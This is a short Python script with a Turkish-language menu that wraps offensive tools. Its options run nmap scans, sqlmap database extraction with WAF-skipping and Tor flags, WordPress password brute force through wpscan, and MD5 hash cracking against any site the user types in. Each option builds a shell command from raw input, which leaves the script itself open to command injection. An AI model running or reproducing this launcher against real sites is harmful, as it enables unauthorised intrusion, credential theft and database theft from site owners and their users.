import os
author="Coded By Picadoor :)"                 
print("""
                _          _   _                   _               _                  
   ___ ___   __| | ___  __| | | |__  _   _   _ __ (_) ___ __ _  __| | ___   ___  _ __ 
  / __/ _ \ / _` |/ _ \/ _` | | '_ \| | | | | '_ \| |/ __/ _` |/ _` |/ _ \ / _ \| '__|
 | (_| (_) | (_| |  __/ (_| | | |_) | |_| | | |_) | | (_| (_| | (_| | (_) | (_) | |   
  \___\___/ \__,_|\___|\__,_| |_.__/ \__, | | .__/|_|\___\__,_|\__,_|\___/ \___/|_|   
                                     |___/  |_|                                       
____________________
1- Nmap İle Hafif Port Tara
2- Nmap İle Servis Versiyon Bilgisini Al
3- Sqlmap İle Dbs Çek
4- Waff Bypass Sql
5- Site İp Adresi Öğrenme
6- WpsScan Brute Force
7- WpsScan İle Sitede Genel Tarama Yapma
8- MD5 Cracker
_______________________
""")
vur = input("Lütfen yapacağınızı seçiniz -> ")
if vur == "1" :
   vur2 = input("ip veya link girin => ") 
   os.system("nmap " + vur2)
if vur == "2" : 
   vur3 = input("ip adresi => ")
   os.system("sudo nmap -sS -sV " + vur3)
if vur == "3":
   vur4 = input("açıklı url => ")
   os.system("sqlmap "+vur4 + "--dbs --batch")
if vur == "4":
   vur4 = input("Example : https://otuzbir.com/ => ")
   os.system("sqlmap "+vur4 + "--forms --risk=3 --level=5 --skip-waf -v 2 --dbs --batch --tor")
if vur == "5":
   vur4 = input("ip'sini bulmak istediğiniz site => ")
   os.system("ping "+vur4 +"")
if vur == "6":
   vur4 = input("BruteForce Yapmak İstediğiniz Wordpress Sitesi => ")
   os.system("wpscan --url "+vur4 +" --passwords wordlist.txt --usernames user.txt")
if vur == "7":
   vur4 = input("Tarama Yapmak İstediğiniz Site => ")
   os.system("wpscan --url "+vur4+" ")
if vur == "8":
   vur4 = input("Kırmak İstediğinz MD5 => ")
   os.system("pip install urllib3")
   os.system("pip install requests")
   os.system("pip install bs4")
   os.system("python3 md5-cracker.py "+vur4+" ")
else   : 
  print("yanlış seçim")
  os.system("python3 oto.py")

